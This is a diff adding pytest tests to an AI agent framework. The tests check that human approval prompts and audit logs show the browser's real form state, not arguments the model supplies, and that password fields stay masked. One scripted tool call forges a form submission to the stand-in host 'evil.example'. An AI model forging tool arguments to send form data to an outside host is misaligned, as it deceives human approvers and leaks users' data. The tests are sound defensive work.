@@ -6,9 +6,10 @@ from conftest import FakeBrowserTransport, ScriptedChatModel, read_audit, tool_c
 from langchain_core.messages import AIMessage, ToolMessage
 from langgraph.types import Command
 
-from loom.browser import BrowserField, PageState
+from loom.browser import _PASSWORD_MASK, BrowserField, PageState
 from loom.config import Settings
 from loom.graph import _APPROVAL_SIZE_LIMIT, build_graph
+from loom.tools import make_tools
 
 URL = "http://127.0.0.1:9/form"
 
@@ -138,3 +139,77 @@ def test_oversize_form_state_is_refused_before_approval(tmp_path):
     records = read_audit(tmp_path)
     assert [(record["actor"], record["decision"]) for record in records] == [("loom", "rejected")]
     assert json.loads(records[0]["args"]) == {"reason": "form state exceeds the approval size limit"}
+
+
+def test_interrupt_shows_the_transport_state_not_the_model_args(tmp_path):
+    fake = FakeBrowserTransport({URL: form_page()})
+    graph = make_graph(
+        tmp_path,
+        [
+            tool_call_msg("browser_open", {"url": URL}),
+            tool_call_msg("browser_fill", {"fields": {"name": "Ada Lovelace", "message": "Hello"}}),
+            tool_call_msg("browser_submit", {"url": "http://evil.example", "fields": {"name": "FAKE"}}),
+            AIMessage(content="form submitted"),
+        ],
+        fake,
+    )
+    config = {"configurable": {"thread_id": "t5"}}
+
+    paused = graph.invoke(
+        {"messages": [{"role": "user", "content": "send the contact form"}], "run_id": "r5"}, config
+    )
+    payload = paused["__interrupt__"][0].value
+
+    shown = json.loads(payload["tools"][0]["args"])
+    assert shown["url"] == URL, "the approval carries the transport's real page url"
+    assert shown["fields"]["name"] == "Ada Lovelace" and shown["fields"]["message"] == "Hello"
+    dumped = json.dumps(payload)
+    assert "FAKE" not in dumped and "evil.example" not in dumped, "forged args never reach the approval"
+
+    graph.invoke(Command(resume={"decision": "approve"}), config)
+    records = read_audit(tmp_path)
+    assert [(record["actor"], record["decision"]) for record in records] == [("human", "approved"), ("loom", "executed")]
+    real = {"url": URL, "fields": {"name": "Ada Lovelace", "email": "", "message": "Hello"}}
+    for record in records:
+        assert json.loads(record["args"]) == real, "every audit row records the transport's state, not the model args"
+
+
+def test_fake_transport_masks_password_fields_like_the_real_one(tmp_path):
+    page = PageState(
+        url=URL,
+        title="Sign in",
+        fields=(
+            BrowserField("user", "User", "text", ""),
+            BrowserField("password", "Password", "password", "prefilled-secret-1"),
+        ),
+    )
+    fake = FakeBrowserTransport({URL: page})
+    registry = make_tools(
+        Settings(loom_env="dev", loom_data_dir=tmp_path, loom_sandbox_root=tmp_path / "sandbox"), {"browser": fake}
+    )
+
+    opened = registry["browser_open"].func.invoke({"url": URL})
+    filled = registry["browser_fill"].func.invoke({"fields": {"password": "typed-secret-2"}})
+
+    assert _PASSWORD_MASK in opened and _PASSWORD_MASK in filled, "renders show the mask, not the value"
+    for secret in ("prefilled-secret-1", "typed-secret-2"):
+        assert secret not in opened and secret not in filled, f"no password value reaches the model: {secret}"
+
+    graph = make_graph(
+        tmp_path,
+        [
+            tool_call_msg("browser_open", {"url": URL}),
+            tool_call_msg("browser_fill", {"fields": {"password": "typed-secret-2"}}),
+            tool_call_msg("browser_submit", {}),
+            AIMessage(content="done"),
+        ],
+        FakeBrowserTransport({URL: page}),
+    )
+    config = {"configurable": {"thread_id": "t6"}}
+
+    paused = graph.invoke({"messages": [{"role": "user", "content": "sign in"}], "run_id": "r6"}, config)
+
+    payload = json.dumps(paused["__interrupt__"][0].value)
+    assert _PASSWORD_MASK in payload, "the approval shows the masked field"
+    for secret in ("prefilled-secret-1", "typed-secret-2"):
+        assert secret not in payload, f"the approval never carries a password value: {secret}"
